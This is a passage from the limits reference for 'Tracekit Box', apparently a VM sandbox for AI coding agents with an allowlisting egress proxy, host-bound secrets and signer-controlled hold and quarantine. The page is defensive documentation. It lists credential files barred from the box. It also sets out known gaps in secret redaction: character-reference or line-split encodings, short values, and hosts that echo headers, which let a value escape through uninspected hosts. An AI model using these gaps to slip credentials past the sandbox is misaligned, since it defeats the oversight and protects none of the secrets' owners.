| `inspect: all` and hosts off the allowlist | Refused at once, before any decision or approval and without resolving the name: the box's CA may impersonate only allowed hosts (with no allow entries and no secrets, no host at all: its only DNS name constraint is the reserved `invalid`, and it excludes every IP address). A port the allowlist does not name for an allowed host (`example.com:8443` when only `example.com` is listed, `example.com:9999` when only `example.com:8443` is) and plain HTTP to a host off the list are refused the same way | 403 `Box must inspect this host but the box CA may not impersonate it`, hint `Add the host to the box's allow list so the CA covers it.` A port: 403 `with inspect: all, port 8443 of this host is not on the allow list, so it is refused without asking`, hint `Ask the operator to allow example.com:8443, or use a port the allow list names.` Plain HTTP: 403 `with inspect: all, a host off the allow list is refused without asking`, hint `Add the host to the box's allow list.` | Put the host (or `host:port`) on the allowlist, or use `inspect: bound` |
| Protocols | HTTP `CONNECT` and absolute-form HTTP only; no UDP, no DNS from the box, no SSH | `ssh: Could not resolve hostname github.com`, or a connection refused; UDP (DNS, QUIC, NTP) has no route | Use HTTPS: `git clone https://github.com/...` with a token bound to `github.com`; names are resolved by the proxy on the host |

## Secrets

| Limit | Default | What Box says when hit | What to do |
|---|---|---|---|
| Secret names | `[A-Z_][A-Z0-9_]*`, and not one of the proxy and CA variables Box sets (`HTTP_PROXY`, `SSL_CERT_FILE`, …) | `secret "gh": the name is the env var the box sees; use upper case, digits and _ (e.g. GITHUB_TOKEN)` | Use an upper-case name |
| Secret values | Not empty, at most 64 KiB, one line (no line break or NUL) | `secret GH: the value is over 64 KiB`; `secret GH: the value has a line break or NUL; a header value can't carry one` | Secrets are header values; for a file with a trailing newline, `from_file` drops it |
| Secret values in env, commands and the task | Neither a box's `env` values nor a per-exec `--env` value may contain a secret's value (a box env name that is also a secret is refused too), nor may an exec's command line, `--cwd` or up-front stdin (`stdin_data`), and the box's `created` and `task` records are scrubbed before they are sent: a placeholder and a value are both shown as `[secret NAME]` (an exec decision shows a placeholder as `tkbox_NAME_…`) | `env TOKEN holds the value of secret GH`: the box is not created, or the command does not run; for the command, cwd or stdin: `the command, its cwd or its stdin holds the value of secret GH`. The refusal names the key and the secret, never the value | Give the value as a secret (`--secret`, `secrets:`), and use the placeholder the box gets in that variable |
| Secret hosts | Exact host names: no ports, no wildcards (refused in tkbox.yaml, in `--secret` and by the daemon) | In tkbox.yaml or `--secret`: `host "*.github.com" is a wildcard: a secret goes to exact hosts only; list each one (e.g. [api.github.com, uploads.github.com])`; from the API: `secret GH: host "*.github.com" is a wildcard; a secret is bound to exact hosts only` | List each host the secret is for |
| Secret header | One header per secret; no header given means `Authorization`. `tkbox run` prints each secret's header: `tkbox: secret GH goes only in the Authorization header, only to its bound hosts` | A request that carries the placeholder in another header is blocked (see the next row) | Name the header with `#Header` or `header:` |
| Where a secret is swapped in | Only into its bound header (default `Authorization`), only on requests to its hosts that the proxy reads | A placeholder in the body: 403 `a placeholder for secret GH is in the request body; Box swaps secrets only into request headers`, hint `Send the secret in its bound header.` A placeholder in another header or to another host: blocked, `tkbox.secret.leak` | Use header authentication for bound secrets, and name the header with `#Header` or `header:` |
| Which requests are checked for placeholders | Requests to bound hosts and plain HTTP requests (request line, headers and body); with `inspect: all`, every allowed HTTPS host too | On other HTTPS hosts the proxy sees only the host, port and TLS server name: nothing is detected, and only the placeholder can leave, never the value | `--inspect all` checks every allowed HTTPS host; it breaks clients that pin certificates |
| Secret values in requests and responses | On connections the proxy reads, a secret's real value is blocked in requests anywhere it is not being swapped in, and redacted from responses (headers, body, trailers) in its raw, percent-encoded, JSON-escaped, hex and base64 forms, each matched without regard to case (so an upper- or lower-cased echo and upper-case hex are caught). Other forms are not: HTML or XML character references (`&#x2F;`), a value split across lines (MIME or PEM wrapping), the base64 or hex of a case-changed value, or any encoding a host invents; values shorter than 6 bytes are not redacted. Requests to bound hosts go upstream with `Accept-Encoding: identity`, so responses arrive unencoded | A bound host that compresses anyway has its body decoded and redacted; one Box can't decode: 502 `the host answered with …, which Box can't check for secret values`. A bound host that reflects the credential in a form Box does not know hands it to the guest, which can then send it out through any allowed host Box does not inspect | Bind secrets only to hosts that do not reflect request headers back; use `inspect: all` so the value is blocked in requests to every allowed host |
| Upgrades and partial responses on bound hosts | A request to a host with a bound secret may not ask for a protocol upgrade (WebSocket, h2c); `Range`, `If-Range` and `Request-Range` are removed from its requests and a 206 answer is refused | 403 `Box does not relay protocol upgrades (such as WebSocket) to a host with a bound secret: it could not keep the secret's value out of the upgraded stream`; 502 `the host answered with a partial response (206), which Box can't check whole for secret values` | Use the host's plain HTTPS API with the bound key; a WebSocket API (for example a realtime model API over wss) can't use a bound secret in v0 |

## Behaviour

| Limit | Default | What Box says when hit | What to do |
|---|---|---|---|
| Only `/workspace` changes come out | `tkbox diff` and `tkbox apply` see only `/workspace`. Changes elsewhere in the VM are lost at stop | Nothing | Have the agent write its results under `/workspace` |
| Workspace contents | In a git work tree: tracked files and untracked files that are not ignored, never `.git`. Outside git: every file except `.git`. Without `--workspace`: an empty `/workspace` | Other files are simply absent; `git` commands in `/workspace` fail with `not a git repository`. For a directory outside git, `tkbox run` prints `tkbox: <dir> is not a git work tree: copying every file except credential files` | Install dependencies inside the box; run git on the host after `tkbox apply` |
| Credential files | Never copied into the box, git or not, ignored or not: `.env` and `.env.*` (except `.env.example`, `.env.sample`, `.env.template`, `.env.dist`), `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.jks`, `*.keystore`, `*.tfstate`, `*.tfstate.backup`, `*.tfvars`, `id_rsa*`, `id_ed25519*`, `id_ecdsa*`, `id_dsa*`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `.pgpass`, `.htpasswd`, `.dockercfg`, and the directories `.ssh`, `.aws`, `.gnupg`, `.kube`, `.docker`, `.azure`, `.config/gcloud` | Only the daemon's log says so: `workspace …: left out 2 credential file(s) the box must not see: …` | Give the box what it needs as a bound secret instead |
| Workspace size | 100,000 files and 4 GiB | `workspace … has more than 100000 files (WorkspaceFiles); add generated or vendored dirs to .gitignore, or point the box at a smaller directory` | Ignore generated and vendored directories, or use a smaller directory |
| User in the box | Commands run as root (uid 0) in the VM; the VM is the boundary | Nothing | Tools that refuse to run as root need their own switch (Claude Code: `IS_SANDBOX=1`) |
| Signer | A Tracekit 1.4.2 signer on the same host, reached over a Unix socket only. It must answer, or Box starts no daemon and refuses every later decision | `Tracekit Box reaches its signer over a Unix socket only; … is not one`. At daemon start: `tkbox: the daemon needs a Tracekit signer: no signer answering at …`, then ``start one with `tracekit up`, or pass --unrecorded to run boxes that record nothing``. Later: `the Tracekit signer did not answer, so nothing runs (fail closed): …` | Start the signer on this host. `--unrecorded` is for debugging only: it records nothing and every box says so |
| Containment (a held or quarantined run) | The daemon asks the signer for each running box's containment state every 2 s for the box's first minute, then every 15 s (each poll makes the signer read the run, so polling every box every 2 s would slow every decision on a shared signer), and at once after an exec or egress decision that names an incident. A hold pauses the VM, a quarantine kills it | A hold or quarantine set on the signer takes effect within 2 s early in a box's life; on a long-running box it can take up to about 15 s, unless one of the box's decisions named an incident, which triggers a check at once. The box's events and `tkbox ls` show it | Nothing; decisions the signer refuses are refused at once regardless |
| Dev signer assurance | `tracekit init --dev` runs the signer as your user | `tracekit verify` prints dev assurance | For CI and production, run the signer as another user on the daemon's host ([SECURITY.md](../SECURITY.md)) |
| GitHub Action assurance | The action creates a dev signer and its trust file in the same job | `tracekit verify` prints dev assurance, and the trust file proves only that the bundle was not changed after the job | For stronger assurance, run `tkbox` on a host you control with a system-mode signer, and keep its trust file outside that host |
| Firecracker and the guest kernel | The daemon downloads Firecracker v1.17.0 and kernel 6.1.155 on its first start, checks them by SHA-256 and caches them in `<state dir>/images/assets` | ``fetch firecracker v1.17.0: … (pass --firecracker/--kernel to use local files)``; a checksum mismatch installs nothing | Give the host HTTPS access to GitHub and S3, or pass `--firecracker FILE --kernel FILE` |
| KVM | `/dev/kvm`, readable and writable by the daemon's user | The daemon does not start, and checks this before downloading anything: `this host can't run boxes: /dev/kvm is not usable (…): enable KVM (nested virtualization on a VM) and add this user to the kvm group`; on macOS: `this host can't run boxes: tkbox daemon runs on Linux with /dev/kvm, not darwin (use a Linux VM such as Lima)` | Use a host with KVM, or add the user to the `kvm` group |
